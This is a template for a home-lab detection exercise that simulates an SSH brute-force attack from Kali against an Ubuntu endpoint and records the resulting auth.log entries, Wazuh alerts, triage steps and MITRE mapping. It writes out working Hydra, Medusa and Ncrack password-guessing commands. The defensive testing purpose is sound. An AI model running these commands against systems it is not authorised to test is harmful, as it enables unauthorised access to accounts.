# 🔐 Attack 02 – SSH Brute-Force Attack (Ubuntu Endpoint)

## Attack Overview

| Field | Details |
|---|---|
| **Attack Name** | SSH Brute-Force Attack |
| **Target** | Ubuntu Desktop 26.04 (UBUNTU-ENDPOINT) |
| **Attacker** | Kali Linux (192.168.x.x) |
| **MITRE Tactic** | Credential Access |
| **MITRE Technique** | T1110.001 – Brute Force: Password Guessing |
| **Severity** | High |
| **Date Performed** | YYYY-MM-DD |

## Objective

To simulate an SSH brute-force attack against the Ubuntu endpoint, testing Wazuh's detection of repeated failed SSH authentication attempts and its ability to trigger alerts for credential access threats.

## Attack Methodology

1. Identify SSH service on target (port 22)
2. Launch dictionary-based brute-force attack using Hydra
3. Monitor auth.log for failed authentication entries
4. Verify Wazuh alert generation for brute-force detection
5. Document detection timeline and alert details

## Lab Environment

| Machine | Role | IP Address | OS |
|---|---|---|---|
| Kali Linux | Attacker | `192.168.x.x` | Kali 2025.2 |
| UBUNTU-ENDPOINT | Target/Victim | `192.168.x.x` | Ubuntu Desktop 26.04 |
| Wazuh Server | SIEM/Monitor | `192.168.x.x` | Ubuntu Server 26.04 |

## Kali Commands

```bash
# Verify SSH is running on target
nmap -p 22 -sV <TARGET_IP>

# Hydra SSH Brute-Force
hydra -l <username> -P /usr/share/wordlists/rockyou.txt ssh://<TARGET_IP>

# Hydra with specific user list
hydra -L userlist.txt -P /usr/share/wordlists/rockyou.txt ssh://<TARGET_IP> -t 4

# Medusa SSH Brute-Force
medusa -h <TARGET_IP> -u <username> -P /usr/share/wordlists/rockyou.txt -M ssh

# Ncrack SSH
ncrack -p 22 --user <username> -P /usr/share/wordlists/rockyou.txt <TARGET_IP>

# Manual SSH attempt
ssh <username>@<TARGET_IP>
```

## Linux Logs Generated

**auth.log (`/var/log/auth.log`):**
```
Jun  6 12:00:01 ubuntu-endpoint sshd[12345]: Failed password for <user> from <KALI_IP> port 54321 ssh2
Jun  6 12:00:01 ubuntu-endpoint sshd[12345]: Failed password for <user> from <KALI_IP> port 54322 ssh2
Jun  6 12:00:02 ubuntu-endpoint sshd[12345]: Failed password for invalid user admin from <KALI_IP> port 54323 ssh2
```

**btmp (failed logins):**
```bash
sudo lastb | head -20
# Shows failed login attempts with timestamps and source IPs
```

## Wazuh Alerts

| Alert ID | Rule ID | Description | Level | Timestamp |
|---|---|---|---|---|
| <!-- ID --> | 5710 | Attempt to login using a non-existent user | 5 | <!-- Time --> |
| <!-- ID --> | 5712 | SSHD brute force trying to get access to the system | 10 | <!-- Time --> |
| <!-- ID --> | 5720 | Multiple authentication failures | 10 | <!-- Time --> |

```json
{
  "rule": {
    "id": "5712",
    "description": "SSHD brute force trying to get access to the system",
    "level": 10,
    "mitre": {
      "id": ["T1110"],
      "tactic": ["Credential Access"]
    }
  },
  "agent": {
    "name": "UBUNTU-ENDPOINT"
  },
  "data": {
    "srcip": "<KALI_IP>",
    "srcuser": "<username>"
  }
}
```

## Event IDs

| Wazuh Rule ID | Description | Level |
|---|---|---|
| 5710 | Non-existent user login attempt | 5 |
| 5712 | SSH brute-force detected | 10 |
| 5716 | SSH authentication success after failures | 3 |
| 5720 | Multiple authentication failures | 10 |

## Detection Process

1. Wazuh agent on Ubuntu endpoint captured auth.log entries in real-time
2. Multiple `Failed password` entries from the same source IP triggered rule 5712
3. Alert escalated due to frequency threshold exceeded within timeframe
4. Dashboard showed aggregated failed login attempts with source IP details

## Investigation Steps

1. **Alert Triage:** Reviewed Wazuh alert for SSH brute-force (Rule 5712)
2. **Source Identification:** Identified attacker IP from `data.srcip` field
3. **Account Analysis:** Determined which accounts were targeted
4. **Timeline Mapping:** Established attack start/end times
5. **Success Verification:** Checked for Event ID 5716 (successful login after failures)
6. **Remediation:** Documented recommended actions (IP block, fail2ban, key-based auth)
7. **Verdict:** Confirmed SSH brute-force credential access attempt

## MITRE ATT&CK Mapping

| Field | Value |
|---|---|
| **Tactic** | Credential Access |
| **Technique ID** | T1110.001 |
| **Technique Name** | Brute Force: Password Guessing |
| **Procedure** | Adversary used Hydra from Kali Linux to perform dictionary-based brute-force attack against SSH service on the Ubuntu endpoint |
| **Detection Opportunity** | Monitor auth.log for multiple `Failed password` entries from a single source IP; Wazuh rule 5712 detects this pattern |

## Findings

| # | Finding | Severity | Evidence |
|---|---|---|---|
| 1 | <!-- Finding --> | <!-- High --> | <!-- auth.log entries --> |
| 2 | <!-- Finding --> | <!-- High --> | <!-- Wazuh alert count --> |

## Lessons Learned

- <!-- Fail2ban configuration and effectiveness -->
- <!-- SSH key-based authentication vs password auth -->
- <!-- Wazuh SSH detection rule tuning -->
- <!-- Account lockout policy for Linux -->
- <!-- Port knocking / non-standard SSH port considerations -->

---

> 📌 **Status:** 📝 Template — Update with actual findings after performing the attack simulation.
